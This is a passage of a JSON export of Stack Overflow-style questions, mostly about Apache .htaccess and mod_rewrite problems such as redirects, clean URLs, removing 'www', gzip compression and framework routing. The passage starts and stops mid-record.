Laravel.\nBut I'm breaking my head 2 days over a (small) problem.</p>\n\n<p>When I browse to the URL \"laravel.app\", It shows me the folder content instead of the index-page of Laravel.</p>\n\n<p>These are my settings:</p>\n\n<p>Virtual Host:</p>\n\n<pre><code>&lt;VirtualHost *:80&gt;\n DocumentRoot \"/Applications/MAMP/htdocs/laravel/public\"\n ServerName laravel.app\n\n &lt;Directory \"/Applications/MAMP/htdocs/laravel/public\"&gt;\n  Options All\n  AllowOverride All\n &lt;/Directory&gt;\n&lt;/VirtualHost&gt;\n</code></pre>\n\n<p>.htaccess:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n Options +FollowSymLinks\n RewriteEngine On\n Order allow,deny\n Allow from all\n&lt;/IfModule&gt;\n\n&lt;IfModule mod_rewrite.c&gt;\n RewriteCond %{REQUEST_FILENAME} !-f\n RewriteCond %{REQUEST_FILENAME} !-d\n RewriteRule ^(.*)$ index.php/$1 [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>I added \"Order allow, deny\" and \"Allow from all\", else I get a 404.\nWhat could be the problem?</p>\n\n<p>Regards</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":25,"score":1,"question_id":12593503,"title":".htaccess redirect with ignore query string","body":"<p>I would like to redirect without looking at the query string, and my redirect result no need append the query string as well, so I add a <code>?</code> at the end of the RewriteRule.</p>\n\n<p>I tried the following syntax, but the outcome just close to it.</p>\n\n<pre><code>RewriteCond %{QUERY_STRING} .* [NC]\nRewriteRule ^exd\\.asp$ http://www.example.com/index.php?r=p/consumer? [R=301,L]\n</code></pre>\n\n<p>and also, i tried to escape the first <code>?</code>, which I need it, but still the same outcome.</p>\n\n<pre><code>RewriteRule ^exd\\.asp$ http://www.example.com/index.php\\?r=p/consumer? [R=301,L]\n</code></pre>\n\n<p>Outcome:</p>\n\n<pre><code>http://www.example.com/index.php?r=p/consumer%3f\n</code></pre>\n\n<p>I want to get ride of the <code>%3f</code>.</p>\n\n<p>Thanks!</p>\n"},{"tags":["wordpress",".htaccess","rewrite"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12581124,"title":"Wordpress Load - Issue with Rewrite rules?","body":"<p>I have begun to have some issues over the past week with the site not loading or not loading properly (mainly in Chrome and Firefox), as well as a time when the permalink structure reset to the WordPress default, and a couple of times when I've been logged out of the WordPress back-end when making edits.</p>\n\n<p>My web host said that it it was most likely an error with a mis-configured re-write rule in the .htaccess file. I can't see anything wrong (but am not sure whether I would know if I saw it...)</p>\n\n<p>The only times I find rewrite mentioned in htaccess are pasted below.</p>\n\n<p>Do you think this is what the problem is, or something else?</p>\n\n<p>Thanks</p>\n\n<pre><code># BEGIN W3TC Skip 404 error handling by WordPress for static files\n&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteCond %{REQUEST_URI} !(robots\\.txt|sitemap(_index)?\\.xml(\\.gz)?|[a-z0-9_\\-]+-sitemap([0-9]+)?\\.xml(\\.gz)?)\n    RewriteCond %{REQUEST_FILENAME} \\.(css|js|htc|html|htm|rtf|rtx|svg|svgz|txt|xsd|xsl|xml|asf|asx|wax|wmv|wmx|avi|bmp|class|divx|doc|docx|eot|exe|gif|gz|gzip|ico|jpg|jpeg|jpe|mdb|mid|midi|mov|qt|mp3|m4a|mp4|m4v|mpeg|mpg|mpe|mpp|otf|odb|odc|odf|odg|odp|ods|odt|ogg|pdf|png|pot|pps|ppt|pptx|ra|ram|svg|svgz|swf|tar|tif|tiff|ttf|ttc|wav|wma|wri|xla|xls|xlsx|xlt|xlw|zip)$ [NC]\n    RewriteRule .* - [L]\n&lt;/IfModule&gt;\n# END W3TC Skip 404 error handling by WordPress for static files\n# BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n# END WordPress\n</code></pre>\n"},{"tags":["regex",".htaccess","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":32,"score":-1,"question_id":12555579,"title":"Regular Expression for Redirection","body":"<p>Can some one please give me a regular expression that can basically redirect anything that a particular folder.</p>\n\n<p>eg:</p>\n\n<p><strong>webite.com/tags/</strong>*Regular Expression --> (character or number that comes after /tags/)</p>\n\n<p>Basically i want to redirect anything that comes after /tags/ t the main website.</p>\n"},{"tags":["regex",".htaccess","url","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12591245,"title":"Redirect deep link URLs to new domain with htaccess","body":"<p>Say for example you currently host a site www.domain.com and you are going to move it to www.new-domain.com.  Now, currently you're blog structure is www.domain.com/2012/09/post-name and your new blog structure will be www.new-domain.com/blog/post-name.  I know I can do a 301 permanent redirect on domain.com to point to new-domain.com, but is there a way to capture the long-tail URL and RegEx a rewrite with htaccess.  Usually I would do:</p>\n\n<pre><code>RedirectMatch 301 ^/([0-9]{4})/([0-9]{2})/(.*)$ http://domain.com/blog/$3\n</code></pre>\n\n<p>If I need to change URL structure within the same domain.  Will this catch redirects from the old domain also?</p>\n"},{"tags":[".htaccess","redirect","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12500532,"title":"Redirect 301 for urls with extension to none but under few directories tree level","body":"<p>I found this solution to redirect urls from <code>www.domain.com/example.php</code> to <code>www.domain.com/example</code> successfully but I cannot do the same when are few subdirs present, like with: <code>domain.com/dir1/di2/dir3/example.php</code> to <code>domain.com/dir1/di2/dir3/example</code></p>\n\n<p>How should this rule be modded in order to make the previous redirection work?</p>\n\n<pre><code>RewriteRule (.*).php$ /$1 [R=301,L]\nRewriteRule (.*).html$ /$1 [R=301,L]\n</code></pre>\n\n<p>This is my .htaccess</p>\n\n<pre><code>ErrorDocument 404 /misc/404.html\n\nRewriteEngine on\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}\\.html -f\nRewriteRule ^(.*)$ $1.html\n\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}\\.php -f\nRewriteRule ^(.*)$ $1.php\n\nRewriteRule (.*).php$ /$1 [R=301,L]\nRewriteRule (.*).html$ /$1 [R=301,L]\n\n# Forces a trailing slash to be added\n#RewriteCond %{REQUEST_FILENAME} !-f\n#RewriteCond %{REQUEST_FILENAME} !-d\n#RewriteCond %{REQUEST_URI} !(\\.[a-zA-Z0-9]{1,5}|/)$\n#RewriteRule (.*)$ /$1/ [R=301,L]\n</code></pre>\n\n<p>Thank you!</p>\n"},{"tags":["php",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":77,"score":1,"question_id":12591029,"title":"HTTP 300 Multiple Choices on Apache Server","body":"<p>How can I allow my Apache server to return 300 Multiple Choices responses? It would have to be done using .htaccess and using a PHP page as the error page.</p>\n\n<p>So far I got this:</p>\n\n<pre><code>ErrorDocument 300 \"/300.php\"\n</code></pre>\n\n<p>The valid URL being <a href=\"http://www.example.com/index.html\" rel=\"nofollow\">http://www.example.com/index.html</a> and the test URL being <a href=\"http://www.example.com/index.php\" rel=\"nofollow\">http://www.example.com/index.php</a>. When I use the test URL, I just get a 404 error. What am I doing wrong?</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12574257,"title":"htaccess file error 500","body":"<p>hey people i have a problem with a client host, in my host for tests and develop .htaccess and mod_rewrite works perfectly but when i put the site files in client host give me 500 ERROR. My file .htaccess:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{SCRIPT_FILENAME} !-f\nRewriteCond %{SCRIPT_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?rwr=$1\nAddDefaultCharset UTF-8\n</code></pre>\n\n<p>mod_rewrite is activated on client host because this works:</p>\n\n<pre><code>RewriteEngine on\nRewriteRule teste\\.html http://www.amen.pt [R]\n</code></pre>\n\n<p>so like you can see in <a href=\"http://www.maiormaquina.com/offers\" rel=\"nofollow\">http://www.maiormaquina.com/offers</a> give a 500 error, but in my server\n<a href=\"http://www.amiguinhodesign.com/mm_new/offers\" rel=\"nofollow\">http://www.amiguinhodesign.com/mm_new/offers</a> works fine with the same .htaccess file.</p>\n\n<p>Can anybody help me with this? Thanks!</p>\n"},{"tags":["php","osx","apache",".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12588790,"title":"How to use mod_rewrite on OS X","body":"<p>I use mac os x 10.6.8 and I have a problem with mod_rewrite - it dosent work.</p>\n\n<p>I changed <em>AllowOverride All</em> in <code>/etc/apache2/users/my_user.conf</code> and <code>/etc/apache2/httpd.conf</code>.</p>\n\n<p>.htaccess Code:</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine on\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?q=$1 [L,QSA]\n</code></pre>\n\n<p>PHP:</p>\n\n<pre><code>var_dump($_GET['q']);\n</code></pre>\n\n<p>Result:</p>\n\n<pre><code>Trying: http://localhost/~nonamez123/konkurs/asgfsddsh  \n\nNot Found\n\nThe requested URL /Users/nonamez123/Sites/konkurs/index.php was not found on this server.\n</code></pre>\n\n<p>as you can see, rewrite on <code>index.php</code> going on, but the <code>index.php</code> can not be found</p>\n\n<p>Logs:</p>\n\n<pre><code>127.0.0.1 - - [25/Sep/2012:21:06:13 +0300] [localhost/sid#10080d720][rid#1009d64a8/initial] (3) [perdir\n/Users/nonamez123/Sites/konkurs/] strip per-dir prefix:\n/Users/nonamez123/Sites/konkurs/asfdasdf -    asfdasdf\n127.0.0.1 - - [25/Sep/2012:21:06:13 +0300] [localhost/sid#10080d720][rid#1009d64a8/initial] (3) [perdir\n/Users/nonamez123/Sites/konkurs/] applying pattern '^(.*)$' to uri\n'asfdasdf'\n127.0.0.1 - - [25/Sep/2012:21:06:13 +0300] [localhost/sid#10080d720][rid#1009d64a8/initial] (4) [perdir\n/Users/nonamez123/Sites/konkurs/] RewriteCond:\ninput='/Users/nonamez123/Sites/konkurs/asfdasdf' pattern='!-f' =&gt;\nmatched\n127.0.0.1 - - [25/Sep/2012:21:06:13 +0300] [localhost/sid#10080d720][rid#1009d64a8/initial] (4) [perdir\n/Users/nonamez123/Sites/konkurs/] RewriteCond:\ninput='/Users/nonamez123/Sites/konkurs/asfdasdf' pattern='!-d' =&gt;\nmatched\n127.0.0.1 - - [25/Sep/2012:21:06:13 +0300] [localhost/sid#10080d720][rid#1009d64a8/initial] (2) [perdir\n/Users/nonamez123/Sites/konkurs/] rewrite 'asfdasdf' -&gt;\n'index.php?q=asfdasdf'\n127.0.0.1 - - [25/Sep/2012:21:06:13 +0300] [localhost/sid#10080d720][rid#1009d64a8/initial] (3) split\nuri=index.php?q=asfdasdf -    uri=index.php, args=q=asfdasdf\n127.0.0.1 - - [25/Sep/2012:21:06:13 +0300] [localhost/sid#10080d720][rid#1009d64a8/initial] (3) [perdir\n/Users/nonamez123/Sites/konkurs/] add per-dir prefix: index.php -&gt;\n/Users/nonamez123/Sites/konkurs/index.php\n127.0.0.1 - - [25/Sep/2012:21:06:13 +0300] [localhost/sid#10080d720][rid#1009d64a8/initial] (1) [perdir\n/Users/nonamez123/Sites/konkurs/] internal redirect with\n/Users/nonamez123/Sites/konkurs/index.php [INTERNAL REDIRECT]\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12585910,"title":"htaccess rewrite remove filename","body":"<p>How can I change url in this way using htaccess?</p>\n\n<ol>\n<li><a href=\"http://www.domain.com/index.html?page=home\" rel=\"nofollow\">http://www.domain.com/index.html?page=home</a></li>\n<li><a href=\"http://www.domain.com/indexf6f2.html?page=blog\" rel=\"nofollow\">http://www.domain.com/indexf6f2.html?page=blog</a></li>\n</ol>\n\n<p>To</p>\n\n<ol>\n<li><a href=\"http://www.domain.com/?page=home\" rel=\"nofollow\">http://www.domain.com/?page=home</a></li>\n<li><a href=\"http://www.domain.com/?page=blog\" rel=\"nofollow\">http://www.domain.com/?page=blog</a></li>\n</ol>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":12584573,"title":".htaccess mod_rewrite removing www","body":"<p>I have the following rule in my .htaccess file, </p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^www\\.(.+)$ [NC]\nRewriteRule ^(.*)$ http://%1/$1 [R=301,L]\n</code></pre>\n\n<p>What this is trying to achieve is to re-write www.domain.com to domain.com, however I get the following server error, </p>\n\n<blockquote>\n  <p>This webpage has a redirect loop</p>\n</blockquote>\n\n<p>How do I solve this? I have tried various re-writes of the above and they all result in the same error.</p>\n"},{"tags":[".htaccess","cakephp","url-rewriting","cakephp-1.3","route"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12582053,"title":"Cakephp change Admin Prefix","body":"<p>I have developed a huge admin panel in cakePHP which i can access with SITE_URL/admin.Now i want to change this url by SITE_URL/jpaneladmin without changing any of my functions which i have defiuned with admin_ prefix. Any idea(s)?</p>\n\n<p>any routing rule i can pass to change this url?</p>\n"},{"tags":[".htaccess","authentication","favicon"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":53,"score":2,"question_id":12584202,"title":"how to stop htaccess authentication for favicon.ico request","body":"<p>We have redirect the page from one domain to another domain, the requested domain is https(SSL certified) and its asking htaccess authentication for /favicon.ico\nbut the requested page is not include any code for /favicon.ico\nCould you please give any solution for this? that is without asking htaccess authentication for /favicon.ico</p>\n\n<p>Thanks</p>\n"},{"tags":["regex",".htaccess","mod-rewrite","rewrite","query-string"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12577670,"title":"Redirection using .regex & htaccess to new URL with added query string","body":"<p>Trying to redirect old website blog archives using regex and .htaccess to be found under a new site's main archives using a query string including a category filter.</p>\n\n<p>I am trying to make the following redirection work</p>\n\n<pre><code>RewriteRule ^blog/2012/04 http://example.com/2012/04?cat=306,10,11 [R=301,L]\n</code></pre>\n\n<p>How can I use regex and .htaccess recognize the <code>?</code> in the target URL query string?</p>\n"},{"tags":["javascript","flash",".htaccess","magento"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":315,"score":1,"question_id":12085722,"title":"Magento - can't upload product images in admin","body":"<p>I have recently upgraded from Magento 1.5 to 1.7.  Since then I can't upload product images.  The 'Browse' and 'Upload' buttons appear, but after reaching 100% it disappears and the image is not added.  </p>\n\n<p>The images are being uploaded into the /media/tmp folder, but not into /media/catalog.  Also, I receive the 2 javascript errors:</p>\n\n<ol>\n<li>Uncaught TypeError: Cannot set property 'checked' of undefined (prototype.js)</li>\n<li>#media_gallery_content-image-0 .cell-each input (product.js)</li>\n</ol>\n\n<p>The site is also currently under a sub-domain while in development, so the magento installation is not directly under root.</p>\n\n<p>Here's what I've tried so far:</p>\n\n<ul>\n<li>Adding a php.ini file</li>\n<li>Removing htaccess file from media folder</li>\n<li>Giving 777 permission recursively to Media folder</li>\n<li>Disabling recently added extensions</li>\n<li>Using the dull uploader (no flash uploader)</li>\n<li>Using different browsers (IE, Chrome, FF)</li>\n<li>Replacing both prototype.js and product.js with different versions</li>\n</ul>\n\n<p>I've been working on this for a while and I'm starting to bang my head against the wall.  Any help is greatly appreciated.  Thanks in advance. </p>\n"},{"tags":["php","apache",".htaccess","slash","trailing"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":85,"score":2,"question_id":12046390,"title":"Using htaccess to remove trailing slash","body":"<p>I have a url \"www.example.com/abc/abc.php\"\nIf I change it to \"www.example.com/abc/abc.php/asdasd\", some kind of infinite loop starts and the server's memory peaks to 100%.</p>\n\n<p>I have heard that there's some way by .htaccess by which I can redirect any \"abc.php/asdasd\" to \"abc.php\" only. Please help how, as I am not able to understand it from other examples mentioned on net.</p>\n\n<p>NOTE : I dont want this \"/\" to be removed if it is put at the end of directories though.</p>\n"},{"tags":[".htaccess","mod-rewrite","seo","rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":12332358,"title":"Htaccess and SEO Friendly Permalink","body":"<p>Now, my permalink appears like that;</p>\n\n<p><a href=\"http://www.mywebsite.com/readhoroscope?horoscope=gemini\" rel=\"nofollow\">http://www.mywebsite.com/readhoroscope?horoscope=gemini</a></p>\n\n<p>I want to make this permalink like this;</p>\n\n<p><a href=\"http://www.mywebsite.com/gemini.html\" rel=\"nofollow\">http://www.mywebsite.com/gemini.html</a></p>\n\n<p>How can I do that by using rewrite in htaccess?</p>\n\n<p>Thanks..</p>\n"},{"tags":[".htaccess","web-config"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":97,"score":1,"question_id":12580625,"title":"IIS Remove Subdirectory from urls - web.config & .htaccess","body":"<p>I've asked question before but haven't found solution. So I'm posting again with some additional infos. I've tried to move all file to root from sub-directory called (Silverstripe), but then blank page showed up. even i delete <strong>default.aspx</strong> and <strong>web.config</strong> file too. and also played with <strong>.htaccess</strong> file. and I'm not much awar of these stuff, so this is why i posted my issue here.</p>\n\n<p>The Problem is I want to remove sub-directory from url &amp; permalinks as well. e.g.</p>\n\n<p><a href=\"http://www.jtrainingsolutions.com/Silverstripe/\" rel=\"nofollow\">http://www.jtrainingsolutions.com/Silverstripe/</a> <strong>=></strong> <a href=\"http://www.jtrainingsolutions.com/\" rel=\"nofollow\">http://www.jtrainingsolutions.com/</a> </p>\n\n<p><br />\n<strong>Root Map:</strong></p>\n\n<pre><code> - /Silverstripe - (Subdirectory)\n     - root/Silverstripe/.htaccess\n     - root/Silverstripe/web.config\n     - root/and other Silverstripe CMS files\n - /default.aspx\n</code></pre>\n\n<p><br />\n<strong>default.aspx:</strong></p>\n\n<pre><code>&lt;%\nIf InStr( UCase(Request.ServerVariables(\"SERVER_NAME\")),  UCase(\"www.jtrainingsolutions.com\") ) &gt; 0 Then  \n        Response.Redirect(\"/Silverstripe\")  \nElseIf InStr( UCase(Request.ServerVariables(\"SERVER_NAME\")), UCase(\"jtrainingsolutions.com\") ) &gt; 0 Then  \n        Response.Redirect(\"/Silverstripe\")  \nEnd If  \n%&gt;\n</code></pre>\n\n<p><br />\n<strong>.htaccess file:</strong></p>\n\n<pre><code>### SILVERSTRIPE START ###\n&lt;Files *.ss&gt;\n    Order deny,allow\n    Deny from all\n    Allow from 127.0.0.1\n&lt;/Files&gt;\n&lt;Files web.config&gt;\n    Order deny,allow\n    Deny from all\n&lt;/Files&gt;\n\nErrorDocument 404 /assets/error-404.html\nErrorDocument 500 /assets/error-500.html\n\n&lt;IfModule mod_alias.c&gt;\n    RedirectMatch 403 /silverstripe-cache(/|$)\n&lt;/IfModule&gt;\n&lt;IfModule mod_rewrite.c&gt;\n    SetEnv HTTP_MOD_REWRITE On\n    RewriteEngine On\n\n    RewriteCond %{REQUEST_URI} !(\\.gif$)|(\\.jpg$)|(\\.png$)|(\\.css$)|(\\.js$)|(\\.php$)\n\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteCond %{REQUEST_FILENAME} !-l\n    RewriteRule ^(.*)$ Silverstripe/$1 [L]\n\n    RewriteBase /Silverstripe\n&lt;/IfModule&gt;\n### SILVERSTRIPE END ###\n</code></pre>\n\n<p><br />\nand <strong>web.config file</strong>:</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;configuration&gt;\n    &lt;system.webServer&gt;\n        &lt;security&gt;\n            &lt;requestFiltering&gt;\n                &lt;hiddenSegments applyToWebDAV=\"false\"&gt;\n                    &lt;add segment=\"silverstripe-cache\" /&gt;\n                &lt;/hiddenSegments&gt;\n            &lt;/requestFiltering&gt;\n        &lt;/security&gt;\n        &lt;rewrite&gt;\n            &lt;rules&gt;\n                &lt;rule name=\"SilverStripe Clean URLs\" stopProcessing=\"true\"&gt;\n                    &lt;match url=\"^(.*)$\" /&gt;\n                    &lt;conditions&gt;\n                        &lt;add input=\"{REQUEST_FILENAME}\" matchType=\"IsFile\" negate=\"true\" /&gt;\n                    &lt;/conditions&gt;\n                    &lt;action type=\"Rewrite\" url=\"sapphire/main.php?url={R:1}\" appendQueryString=\"false\" /&gt;\n                &lt;/rule&gt;\n            &lt;/rules&gt;\n        &lt;/rewrite&gt;\n    &lt;/system.webServer&gt;\n&lt;/configuration&gt;\n</code></pre>\n\n<p>Please advise me how to fix this issue. thanks in advance.</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12138829,"title":"htaccess user profile folder","body":"<p>On my website there is a user profile file, which is in php. Where if you write http://www.youdomain.com/user.php?id=[user id]. It shows that users profile with the id. </p>\n\n<p>Is there a way in htaccess that if a write http://www.youdomain.com/users/[user id] it will display the page http://www.youdomain.com?id=[user id]. </p>\n\n<p>Thank you.</p>\n"},{"tags":["flash",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":12579544,"title":"Rules for access to load data from text files","body":"<p>My friend programming the flash movie which loads text data form external .txt files and he said a data don't loads to movie on his hosting.\nThis files placed near of the swf file. Localy it works fine.</p>\n\n<p>I uploaded files to my hosting (page URL with movie <a href=\"http://mysite.com/index.php\" rel=\"nofollow\">http://mysite.com/index.php</a> and movie url <a href=\"http://mysite.com/img/movie.swf\" rel=\"nofollow\">http://mysite.com/img/movie.swf</a>)\nand data wasn't loaded in my case too.</p>\n\n<p>I saw this in web inspector. Yes, movie can't load text files</p>\n\n<p>It seems Apache blocks access to txt files and I must to add some strings to .htaccess.</p>\n\n<p>Could you please explain how I can fix this?</p>\n\n<p>BR</p>\n"},{"tags":[".htaccess","mod-rewrite","yii","rewrite","mamp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":204,"score":0,"question_id":12202890,"title":"yii, mamp, htaccess rewrite urls","body":"<p>I am trying to rewrite yii urls but with no luck. I have spent hours going through sites and come up with the same answer each time which doesn't work for me:</p>\n\n<p><a href=\"http://www.yiiframework.com/doc/guide/1.1/en/topics.url#user-friendly-urls\" rel=\"nofollow\">http://www.yiiframework.com/doc/guide/1.1/en/topics.url#user-friendly-urls</a></p>\n\n<p>I would like to resolve the urls to basic paths e.g</p>\n\n<p>/index.php/site/index\nto\n/</p>\n\n<p>/index.php/ads   and      /index.php/ads/\nto\n/ads</p>\n\n<p>/ads/details?ad=9\nto\n/ads/9</p>\n\n<p>The problem seems to be that the .htaccess has no effect.</p>\n\n<p>I am using:</p>\n\n<p><strong>mamp pro</strong>\non a mac with lion\nand the <strong>web directory is different to the webserver root</strong>.\nI have set <strong>AllowOveride</strong> through the console.</p>\n\n<p>The .htaccess is in the same folder as the main index.php but doesn't register even if I create an error.</p>\n\n<p>I have had no problem with other non-yii web directories using an htaccess file</p>\n\n<pre><code>RewriteEngine On \nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^.*$ /index.php\n</code></pre>\n\n<p>//main.php</p>\n\n<pre><code>  'urlManager'=&gt;array(\n        'urlFormat'=&gt;'path',\n                    'showScriptName'=&gt;false,\n\n        'rules'=&gt;array(\n\n                        '&lt;controller:\\w+&gt;/&lt;id:\\d+&gt;'=&gt;'&lt;controller&gt;/view',\n            '&lt;controller:\\w+&gt;/&lt;action:\\w+&gt;/&lt;id:\\d+&gt;'=&gt;'&lt;controller&gt;/&lt;action&gt;',\n            '&lt;controller:\\w+&gt;/&lt;action:\\w+&gt;'=&gt;'&lt;controller&gt;/&lt;action&gt;',\n        ),\n    ),\n</code></pre>\n"},{"tags":[".htaccess","codeigniter","paypal","ipn"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":12577077,"title":"Codeigniter .htaccess not ignoring directories","body":"<p>I have a website built on codeigniter and am trying to get the PP IPN working with it.  I have looked at a few CI specific libraries, but want to have a stand alone IPN file.</p>\n\n<p>Basically, I have CI installed in the website root and I have another directory 'pp', also in the root.</p>\n\n<p>I'm trying to test the IPN using Paypal's sandbox, but it's returning a 404, I also can't access the file directly.</p>\n\n<p>Here is my .htaccess file:</p>\n\n<pre><code>XSendFile on\nOptions -Indexes\nOptions +FollowSymlinks\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\n\n### Canonicalize codeigniter URLs\nRewriteRule ^(index(/index)?|index(\\.php)?)/?$ / [L,R=301]\nRewriteRule ^(.*)/index/?$ $1 [L,R=301]\n\n# Removes trailing slashes (prevents SEO duplicate content issues)\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.+)/$ $1 [L,R=301]\n\nRewriteCond %{HTTP_HOST} !^(www) [NC]\nRewriteRule ^(.*)$ http://www.mysite.net/$1 [L,R=301]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond $1 !^(index\\.php|pp|robots\\.txt)\nRewriteRule ^(.*)$ index.php/$1 [L]\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n# Without mod_rewrite, route 404's to the front controller\nErrorDocument 404 /index.php\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Here's hoping it's something really obvious!</p>\n\n<p>Thanks,</p>\n\n<p>Ryan</p>\n"},{"tags":[".htaccess","url","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":12242058,"title":"htaccess url query limit","body":"<p>I have a .htaccess file. I have two RewriteRule's that do the same thing.</p>\n\n<p>This one works perfectly, and can handle a huge query:</p>\n\n<pre><code>RewriteRule ^p/(.*)(/?)$ index.php?p=$1 [QSA,L]\n</code></pre>\n\n<p>This one will only handle a query up to 255 characters.</p>\n\n<pre><code>RewriteRule ^(.*)(/?)$ index.php?p=$1 [QSA,L]\n</code></pre>\n\n<p>How do I fix this, and make both handle a huge query?</p>\n"},{"tags":[".htaccess","url-mapping"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12578058,"title":".htaccess capture the current url & take the url as query string to a page","body":"<p>I want to capture the url via .htaccess &amp; send that url as a query string to the page which will check the existence of the url from the DB. </p>\n\n<p>So my problem is i have a old site with www.example.org &amp; this has 4200 old links that should be mapped with the new site www.example.net. </p>\n\n<p>Now i have created a url mapper app which has the old site urls (4200) mapped with the new one. \nIn this url mapper app, i have an .htaccess which will capture the url before sending it to the app. \nNow here i want to capture the complete URL hit by the user which points to the old site &amp; then the url is sent to one page with query string as complete url, which can be checked against the (4200) old urls &amp; then redirected to the corresponding page of new site.</p>\n\n<p>How can i achieve this. To get the compelete URL in .htaccess &amp; pass it to the page as request parameter.</p>\n"},{"tags":[".htaccess","optimization","compression","gzip"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12576841,"title":"Gzip compression using .htaccess","body":"<p>I am creating GZip compression using .htaccess. I am using following code to gzip te js, css files</p>\n\n<pre><code>&lt;ifModule mod_gzip.c&gt;\n  mod_gzip_on Yes\n  mod_gzip_dechunk Yes\n  mod_gzip_item_include file \\.(html?|txt|css|js|php|pl)$\n  mod_gzip_item_include handler ^cgi-script$\n  mod_gzip_item_include mime ^text/.*\n  mod_gzip_item_include mime ^application/x-javascript.*\n  mod_gzip_item_exclude mime ^image/.*\n  mod_gzip_item_exclude rspheader ^Content-Encoding:.*gzip.*\n&lt;/ifModule&gt;\n</code></pre>\n\n<p>but it cannot gzip my files on server. Please let me know about the code for gzip compression</p>\n\n<p>Thanks</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12553642,"title":"Rewrite to support folders as domain aliases while hiding subfolders","body":"<p>I am trying to use domain aliases to point to subfolders on my site where the subfolders name would be hidden from resulting url on rewrite.\ndomain-alias1.com and domain-alias2.com are domain aliases to domain.com</p>\n\n<p>I have the following in my root:</p>\n\n<pre><code>domain.com/\n   .htaccess (listed below)\n  domain-alias1/\n      main/\n      .htaccess (contains only Options -Indexes)\n   domain-alias2/\n ...\n</code></pre>\n\n<p>/.htaccess follows:</p>\n\n<pre><code>RewriteEngine on\nRewriteBase /\n\nRewriteCond %{HTTP_HOST} ^domain-alias1\\.com$ [NC,OR]\nRewriteCond %{HTTP_HOST} ^www\\.domain-alias1\\.com$ [NC]\nRewriteCond %{REQUEST_URI} !^/domain-alias1\nRewriteRule ^(.*)$ domain-alias1/$1 [L]\n\nRewriteCond %{HTTP_HOST} ^domain-alias2\\.com$ [NC,OR]\nRewriteCond 